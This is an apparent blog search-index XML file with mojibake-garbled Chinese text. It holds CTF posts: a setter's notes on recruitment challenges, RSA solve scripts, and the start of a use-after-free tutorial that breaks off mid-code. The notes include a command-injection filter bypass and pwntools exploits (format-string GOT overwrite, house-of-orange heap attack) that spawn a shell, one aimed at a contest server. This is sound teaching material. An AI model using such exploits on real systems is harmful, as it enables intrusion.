<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>NSSCTF 2021 æ‹›æ–°å‡ºé¢˜ç¬”è®°</title>
    <url>/2021/10/06/NSSCTF%202021%20%E6%8B%9B%E6%96%B0%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2>
<p>è¿™æ˜¯æˆ‘ç¬¬äºŒæ¬¡ä¸ºå›¢é˜Ÿæ‹›æ–°èµ›å‡ºé¢˜ï¼Œè¿™æ¬¡ä¸€å¼€å§‹å¬xennyè€æ¿è¯´è¦æä¸ªæ ¡å¤–èµ›é“ï¼Œå¥½å®¶ä¼™ï¼Œè¿™æ¬¡æ‹›æ–°å››èˆäº”å…¥å°±æˆäº†ä¸€ä¸ªå°å‹çš„å…¬å¼€èµ›äº†ï¼Œå½“æ—¶æ­£åœ¨å¥—<span id="more"></span>æ¨¡æ¿é¢˜çš„æ‰‹å¾®å¾®é¢¤æŠ–ï¼Œæœ‰é‚£ä¹ˆä¸€ç¬é—´åœ¨æƒ³è¦ä¸è¦æ•´ç‚¹æ´»ï¼Œä½†æƒ³åˆ°è¿™æ¯”èµ›æ˜¯é¢å‘æ–°ç”Ÿçš„æœ€ç»ˆè¿˜æ˜¯æ²¡æœ‰æ•´ï¼ˆä¸»è¦è¿˜æ˜¯èœï¼Œæ•´ä¸å‡ºæ¥ï¼‰</p>
<p>è¿™æ¬¡çš„é¢˜ç›®æˆ‘è´Ÿè´£çš„æ˜¯pwn1-5,ä»¥åŠå¯†ç å­¦æ–¹å‘çš„1-5ï¼ˆç°ä»£å¯†ç éƒ¨åˆ†ï¼‰, æœ¬æ¥ä¸€å¼€å§‹çš„æ—¶å€™æ˜¯æ²¡æœ‰æ‰“ç®—å‡ºpwné¢˜çš„ï¼Œå› ä¸ºæ–°ç”Ÿå¤§éƒ¨åˆ†éƒ½æ˜¯è¿˜æ²¡æœ‰æ¥è§¦è¿‡CTFçš„å°ç™½ï¼Œæˆ‘è§‰å¾—æ–°ç”Ÿé€šè¿‡è‡ªå­¦æŠŠç¯å¢ƒæ­å»ºå¥½å°±å·®ä¸å¤šäº†ï¼Œæœ€ç»ˆè¿˜æ˜¯è¿«äºwdljtè€æ¿çš„æ·«å¨å‡ºäº†äº”ä¸ªç™½ç»™pwnã€‚</p>
<h2 id="å‡ºé¢˜æ€è·¯"><a class="header-anchor" href="#å‡ºé¢˜æ€è·¯">Â¶</a>å‡ºé¢˜æ€è·¯</h2>
<h3 id="Crypto"><a class="header-anchor" href="#Crypto">Â¶</a>Crypto</h3>
<p>å›¢é˜Ÿé‡Œé¢æç°ä»£å¯†ç çš„å°±ä¸¤ä¸ªäººï¼Œå¦å¤–ä¸€ä¸ªå¸ˆå‚…è¦åŠ ç­å‡ºmiscï¼Œç°ä»£å¯†ç å°±åªæœ‰æˆ‘æ¥ï¼Œåˆå› ä¸ºèµ¶ç€ç¬¬äºŒå¤©ä¸Šé¢˜ï¼Œå°±ç›´æ¥æ‘†çƒ‚æ°´äº†5ä¸ªé¢˜</p>
<p>è¿™äº”ä¸ªå¯†ç é¢˜éƒ½æ˜¯æ¨¡æ¿é¢˜ï¼Œæ”¹éƒ½ä¸å¸¦æ”¹çš„ï¼Œè¿™äº”ä¸ªå¯†ç é¢˜å‡ºé¢˜åŠ èµ·æ¥ä¹Ÿå°±èŠ±äº†ä¸åˆ°20åˆ†é’Ÿï¼Œéš¾åº¦éƒ½ä¸å¤§ï¼Œæ¯ä¸ªé¢˜åº”è¯¥éƒ½èƒ½ç™¾åº¦åˆ°åŸé¢˜ã€‚</p>
<h4 id="crypto1"><a class="header-anchor" href="#crypto1">Â¶</a>crypto1</h4>
<p>ç»™äº†c1,c2,nï¼Œä»¥åŠe1<em>e2 = 3087,åˆå› ä¸º3087 = 3</em>3<em>3</em>7*7 å¤§æ¦‚ç‡æƒ³åˆ°æ¨¡ä¸äº’ç´ ï¼Œè§£é¢˜è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_gong_N_def</span>(<span class="params">e1,e2,c1,c2,n</span>):</span></span><br><span class="line">    e1, e2, c1, c2, n=<span class="built_in">int</span>(e1),<span class="built_in">int</span>(e2),<span class="built_in">int</span>(c1),<span class="built_in">int</span>(c2),<span class="built_in">int</span>(n)</span><br><span class="line">    s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    s1 = s[<span class="number">1</span>]</span><br><span class="line">    s2 = s[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1,s1,n) * <span class="built_in">pow</span>(c2 ,s2 ,n)) % n</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">de</span>(<span class="params">c, e, n</span>):</span></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> k&lt;<span class="number">1000</span>:</span><br><span class="line">        mm = c + n*k</span><br><span class="line">        result, flag = gmpy2.iroot(mm, e)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">True</span> == flag:</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,e1e2):</span><br><span class="line">    <span class="keyword">if</span> e1e2%e1==<span class="number">0</span>:</span><br><span class="line">        e2=e1e2//e1</span><br><span class="line">        c=rsa_gong_N_def(e1, e2, c1, c2, n)</span><br><span class="line">        e=gmpy2.gcd(e1,e2)</span><br><span class="line">        m1=de(c,e,n)</span><br><span class="line">        <span class="keyword">if</span> m1:</span><br><span class="line">            flag=long_to_bytes(<span class="built_in">int</span>(m1))</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="crypro2"><a class="header-anchor" href="#crypro2">Â¶</a>crypro2</h4>
<p>ç®€å•çš„å…±æ¨¡æ”»å‡»</p>
<h4 id="crypto3"><a class="header-anchor" href="#crypto3">Â¶</a>crypto3</h4>
<p>ï¼Œ<br>
è¿™ä¸ªé¢˜æ˜¯å»å¹´xennyè€æ¿åœ¨ç”µè¯é‡Œè€ƒè¿‡æˆ‘çš„ä¸€ä¸ªé¢˜ï¼Œå½“æ—¶æ²¡æœ‰æƒ³å‡ºæ¥ï¼Œè¿™æ¬¡æƒ³èµ·æ¥è¿™ä¸ªé¢˜å°±å‡ºåˆ°äº†æ‹›æ–°èµ›é‡Œï¼Œå‡ºå®Œä¹‹åå®¡é¢˜çš„æ—¶å€™æ‰å‘ç°è‡ªå·±ä¸ä¼šåšxsï¼Œè¿˜æ˜¯å¤ªèœã€‚åæ¥é£äºŒè¥¿å¸ˆå‚…ç»™æˆ‘è¯´æ˜¯NPUCTF2020çš„åŸé¢˜ï¼Œè¿™æ‰å»å­¦äº†ä¸€æ³¢ã€‚<br>
è¿™é‡Œå°±ç›´æ¥è´´ä¸€ä¸‹å¤§ä½¬çš„åšå®¢ï¼š<a href="https://www.cnblogs.com/vict0r/p/13292511.html">https://www.cnblogs.com/vict0r/p/13292511.html</a><br>
è§£é¢˜è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c1=flag1</span><br><span class="line">c2=flag2</span><br><span class="line">a = c1+c2</span><br><span class="line">b = c1*c2</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt;=Zmod(n)[]</span><br><span class="line">f = x^<span class="number">2</span> - a*x +b</span><br><span class="line">f.small_roots(X=<span class="number">2</span>^<span class="number">400</span>)</span><br></pre></td></tr></table></figure>
<h4 id="crypto4"><a class="header-anchor" href="#crypto4">Â¶</a>crypto4</h4>
<p>ç”±äºq = nextPrimeÂ§ , æ‰€ä»¥å¯ä»¥yafuç›´æ¥åˆ†è§£n , ç›´æ¥æ‹¿ä¸‹</p>
<h4 id="crypto5"><a class="header-anchor" href="#crypto5">Â¶</a>crypto5</h4>
<p>ä½e , e = 3</p>
<h3 id="Pwn"><a class="header-anchor" href="#Pwn">Â¶</a>Pwn</h3>
<h4 id="pwn1"><a class="header-anchor" href="#pwn1">Â¶</a>pwn1</h4>
<p>è¿‡æ»¤äº†ä¸€åŠæ‹¿æ¥è¯»æ–‡ä»¶çš„ä¸€äº›å‘½ä»¤ä»¥åŠç©ºæ ¼</p>
<p>payload</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tac$IFS<span class="variable">$9flag</span></span><br></pre></td></tr></table></figure>
<h4 id="pwn2-4"><a class="header-anchor" href="#pwn2-4">Â¶</a>pwn2~4</h4>
<p>è¿™ä¸‰ä¸ªé¢˜éƒ½æ˜¯ã€ŠCTFä»0åˆ°1ã€‹ä¸Šçš„æ¨¡æ¿ï¼Œç›´æ¥ç…§ç€æ‰“å°±è¡Œ<br>
pwn2ï¼šä¿®æ”¹è¿”å›åœ°å€ä¸ºgift<br>
pwn3ï¼šputsæ³„éœ²libcåœ°å€ï¼Œret2libc<br>
pwn4: ç”±äºå¼€äº†pie,æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²ç¨‹åºåœ°å€å’Œlibcåœ°å€ï¼Œç„¶åå†åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»»æ„åœ°å€å†™</p>
<p>å…³äºpwn4åœ¨æµ‹çš„æ—¶å€™å‘ç°äº†ä¸€ä¸ªæœ‰æ„æ€çš„ç°è±¡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;pwn4&#x27;</span>)</span><br><span class="line">elf =  ELF(<span class="string">&quot;pwn4&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%17$p%21$p&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-elf.sym[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x20840</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">printf = elf_base+elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf:system&#125;)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>ç”¨è¿™ä¸ªexpå¯ä»¥æ‹¿åˆ°ä¸€ä¸ªshçš„shell,ä½†ä¸æ˜¯æ¯ä¸€æ¬¡éƒ½èƒ½æˆåŠŸï¼Œç”±äºæˆåŠŸç‡å¤ªä½ï¼Œä¹Ÿæ²¡æœ‰åŠ¨æ€è°ƒè¯•ï¼Œå¸Œæœ›æœ‰çŸ¥é“åŸå› çš„å¤§ä½¬å¯ä»¥ä¸ºæˆ‘è§£æƒ‘ã€‚ç£•å¤´å•¦ï¼Œç °ç °ç °ã€‚<br>
<img src="http://static.zybuluo.com/hgggg/kgn1pamo0ny94c70oeuysz33/Cache_-36b9d8e9cc4ee054..jpg" alt="Cache_-36b9d8e9cc4ee054..jpg-4kB"></p>
<h4 id="pwn5"><a class="header-anchor" href="#pwn5">Â¶</a>pwn5</h4>
<p>è¿™ä¸ªé¢˜å‰æ®µæ—¶é—´å­¦house of orangeå­¦åˆ°çš„ä¸€ä¸ªé¢˜ï¼Œç„¶åå¥—äº†ä¸ªbase64ç¼–è¯‘ç è¡¨çš„éªŒè¯ã€‚</p>
<p>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²åœ°å€ï¼Œç„¶ååˆ©ç”¨getsæº¢å‡ºä¿®æ”¹top chunkå¤§å°ï¼Œç”³è¯·è¶…è¿‡top chunkå¤§å°çš„å—å¾—åˆ°unsortedbin,æœ€åä¼ªé€ _IO_FILEç»“æ„ä½“ï¼Œä¿®æ”¹è™šè¡¨æŒ‡é’ˆæ¥get shell</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28062</span>)</span><br><span class="line">elf =  ELF(<span class="string">&quot;pwn5&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;word: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;username = &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;NSSCTF&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;password = &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;NSSCTF&#123;b@se_xx_64&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;word: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;0x18&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xfe1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;word: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;0x1000&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;%9$p%3$p&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attch(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x21010</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0xf73c0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+ p64(<span class="number">0x60</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload1 = payload1.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(heap_base + <span class="number">0x508</span>)</span><br><span class="line">payload1 += p64(<span class="number">1</span>)*<span class="number">2</span></span><br><span class="line">payload1 += p64(system_addr)</span><br><span class="line">payload = payload+payload1</span><br><span class="line">add(<span class="number">0x400</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>åæ¥çœ‹å¸ˆå‚…ä»¬çš„è®¨è®ºï¼Œæ‰å‘ç°æˆ‘è¢«éé¢„æœŸäº†ï¼Œæœ‰çš„å¸ˆå‚…æ‰¾åœ°æ–¹æ‰“çš„rop,æœ‰çš„å¸ˆå‚…æ‰“æŠŠæ ˆè¿ç§»åˆ°å †ä¸Šï¼Œè¿˜æœ‰å¸ˆè°ƒ malloc reallocè°ƒé€šäº†ï¼Œ æœç„¶æˆ‘è¿˜æ˜¯å¤ªèœäº†ã€‚ç»™å„ä½pwnğŸ‘´ç£•å¤´ğŸŒ¶ï¼Œç °ç °ç °<br>
<img src="http://static.zybuluo.com/hgggg/kgn1pamo0ny94c70oeuysz33/Cache_-36b9d8e9cc4ee054..jpg" alt="Cache_-36b9d8e9cc4ee054..jpg-4kB"></p>
<h2 id="ç»“è¯­"><a class="header-anchor" href="#ç»“è¯­">Â¶</a>ç»“è¯­</h2>
<p>è™½ç„¶ï¼Œè¿™æ¬¡æ ¡å¤–èµ›é“è¢«æ‰“çš„å¾ˆæƒ¨ï¼Œä½†æ˜¯æ ¡å†…çš„äººåŸºæœ¬ä¸Šæ²¡äººåšpwnï¼Œå¸Œæœ›ä¸è¦æŠŠæ–°äººåŠé€€å§ï¼Œè¦æ˜¯å†æ²¡äººå­¦pwn,é˜Ÿé‡Œpwnæ–¹å‘å°±çœŸåªèƒ½æ‘†çƒ‚äº†ï¼Œå‡ºå»å›½èµ›çœ‹åˆ«äººçš„é˜Ÿä¸€ä¸ªé˜Ÿ3ä¸ªpwnğŸ‘´ï¼Œè€Œç°åœ¨é˜Ÿé‡Œå°±åªæœ‰æˆ‘ä¸€ä¸ªäººæpwnçœŸçš„é¡¶ä¸ä½ï¼Œå¸Œæœ›è¿™æ¬¡æ‹›æ–°èƒ½å¸æ”¶äº›æ–°é²œçš„è¡€æ¶²å§ã€‚ä¹Ÿå¸Œæœ›å›¢é˜Ÿèƒ½è¶Šé«˜è¶Šå¥½ã€‚</p>
]]></content>
      <categories>
        <category>å…¶ä»–</category>
      </categories>
      <tags>
        <tag>ç¬”è®°</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF crypto åˆ·é¢˜è®°å½•(æŒç»­æ›´æ–°)</title>
    <url>/2021/10/08/NSSCTF%20crypto%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>è¿™æ˜¯ä¸€ä¸ªè®°å½•åœ¨NSSCTFå¹³å°ä¸Šåˆ·cryptoé¢˜çš„åšå®¢ï¼Œé¢˜ç›®é¡ºåºæŒ‰ç…§åˆ·é¢˜çš„å…ˆåé¡ºåº</p>
<span id="more"></span>
<h2 id="ç¾ŠåŸæ¯-2021-Bigrsa"><a class="header-anchor" href="#ç¾ŠåŸæ¯-2021-Bigrsa">Â¶</a>[ç¾ŠåŸæ¯ 2021]Bigrsa</h2>
<h3 id="é¢˜ç›®"><a class="header-anchor" href="#é¢˜ç›®">Â¶</a>é¢˜ç›®</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2 = <span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n1)</span><br><span class="line">c = <span class="built_in">pow</span>(c, e, n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = %d&quot;</span> % c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output</span></span><br><span class="line"><span class="comment"># c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="åˆ†æ"><a class="header-anchor" href="#åˆ†æ">Â¶</a>åˆ†æ</h3>
<p>n1 å’Œ n2 å­˜åœ¨å…¬å› æ•°</p>
<h3 id="exp"><a class="header-anchor" href="#exp">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2 = <span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#c = pow(m, e, n1)</span></span><br><span class="line"><span class="comment">#c = pow(c, e, n2)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># output</span></span><br><span class="line">c = <span class="number">60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span></span><br><span class="line"></span><br><span class="line">p = gcd(n1,n2)</span><br><span class="line"></span><br><span class="line">q1 = n1 // p</span><br><span class="line">q2 = n2 // p</span><br><span class="line"></span><br><span class="line">phi1 = (p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">phi2 = (p-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d1 = invert(e,phi1)</span><br><span class="line">d2 = invert(e,phi2)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(c,d2,n2)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d1,n1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h2 id="SWPU-2020-happy"><a class="header-anchor" href="#SWPU-2020-happy">Â¶</a>[SWPU 2020]happy</h2>
<h3 id="é¢˜ç›®-v2"><a class="header-anchor" href="#é¢˜ç›®-v2">Â¶</a>é¢˜ç›®</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&#x27;c=&#x27;, &#x27;0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9eL&#x27;)</span><br><span class="line">(&#x27;e=&#x27;, &#x27;0x872a335&#x27;)</span><br><span class="line">#q + q*p^3 =1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586</span><br><span class="line">#qp + q *p^2 = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594</span><br></pre></td></tr></table></figure>
<h3 id="åˆ†æ-v2"><a class="header-anchor" href="#åˆ†æ-v2">Â¶</a>åˆ†æ</h3>
<p>$hint1 = q + qp^3 = (1+p^3)q = q(1+p)(p^2-p+1)$<br>
$hint2 = qp + qp^2 = q(1+p)p$<br>
gcd(hint1,hint2) = q(1+p)<br>
p = hint2 / q(1+p)</p>
<h3 id="exp-v2"><a class="header-anchor" href="#exp-v2">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">c=<span class="number">0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9e</span></span><br><span class="line">e=<span class="number">0x872a335</span></span><br><span class="line"><span class="comment">#q + q*p^3 =1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586</span></span><br><span class="line"><span class="comment">#qp + q *p^2 = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hint1 = <span class="number">1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586</span></span><br><span class="line">hint2 = <span class="number">1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594</span></span><br><span class="line"></span><br><span class="line">gift = gcd(hint1,hint2)</span><br><span class="line"></span><br><span class="line">p = hint2//gift</span><br><span class="line">q = gift // (p+<span class="number">1</span>)</span><br><span class="line">n= p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = invert(e,phi)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>UAF</title>
    <url>/2021/10/04/UAF/</url>
    <content><![CDATA[<h1>Use after free</h1>
<h2 id="åŸç†"><a class="header-anchor" href="#åŸç†">Â¶</a>åŸç†</h2>
<pre><code>å°±æ˜¯æŸå—å†…å­˜é‡Šæ”¾åï¼Œä»»èƒ½è¢«ç”¨æˆ·ä½¿ç”¨ï¼Œå³å­˜åœ¨é‡æŒ‡é’ˆï¼ˆä¸€èˆ¬æ˜¯freeåæ²¡æœ‰å°†æŒ‡é’ˆç½®NULLï¼‰
</code></pre>
<span id="more"></span>
<h3 id="æ ·ä¾‹"><a class="header-anchor" href="#æ ·ä¾‹">Â¶</a>æ ·ä¾‹</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *myname;</span><br><span class="line">  <span class="keyword">void</span> (*func)(<span class="keyword">char</span> *str);</span><br><span class="line">&#125; NAME;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprint</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printmyname</span><span class="params">()</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;call print my name\n&quot;</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  